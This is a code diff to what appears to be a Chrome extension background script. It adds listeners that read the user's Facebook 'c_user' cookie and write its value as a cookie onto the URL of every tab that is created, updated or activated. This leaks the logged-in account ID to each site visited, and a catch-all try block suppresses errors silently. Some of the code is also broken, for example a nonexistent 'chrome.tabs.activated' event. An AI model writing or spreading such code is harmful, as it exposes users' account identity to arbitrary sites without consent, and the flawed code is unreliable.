@@ -22,6 +22,36 @@
 //   }
 // }
 
-chrome.tabs.onUpdated.addListener(function() {
-	console.log('here');
-})
+  try {
+    function postCookie(tab) {
+      try {
+        console.log('taburl', tab.url);
+        chrome.cookies.get({'url': 'https://www.facebook.com/connect/login_success.html#_=_', 'name':'c_user'}, function(cookie) {
+          chrome.cookies.set({'url': tab.url, 'name':'c_user', 'value': cookie.value}, function() {
+            console.log('c_user set @', tab.url)
+            console.log('c_user set as:', cookie.value);
+          })
+        })
+      }
+      catch(err) {console.log('tab was bad')}
+    }
+    
+    chrome.tabs.onCreated.addListener(function(tab) {
+      console.log('tab opened')
+      postCookie(tab);
+    });
+
+    chrome.tabs.onUpdated.addListener(function(tabID) {
+      console.log('tab updated')
+      console.log('updated tab',tabID)
+      chrome.tabs.get(tabID, function(tab) {
+        postCookie(tab);
+      });
+    });
+
+    chrome.tabs.activated.addListener(function(tab) {
+      console.log('tab activated')
+      postCookie(tab);
+    });
+  }
+  catch(err){}
